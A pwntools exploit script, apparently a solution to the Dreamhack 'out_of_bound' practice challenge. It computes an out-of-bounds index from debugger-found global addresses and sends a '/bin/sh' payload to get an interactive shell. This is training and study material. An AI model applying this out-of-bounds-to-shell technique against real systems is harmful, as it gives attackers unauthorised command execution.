from pwn import *

binary = "./out_of_bound"
# r = remote("host8.dreamhack.games", 8591)
r = process(binary)
e = ELF(binary)

command = 0x804a060
name = 0x804a0ac
idx = str(int((name - command) / 0x4) + 2)

log.info("idx: " + str(idx))

payload = b"/bin/sh\x00"
payload += p64(name)

r.sendafter(b"name: ", payload)
r.sendline(idx.encode())
r.interactive()

# pwndbg> p &command
# $2 = (<data variable, no debug info> *) 0x804a060 <command>
# pwndbg> p &name
# $3 = (<data variable, no debug info> *) 0x804a0ac <name>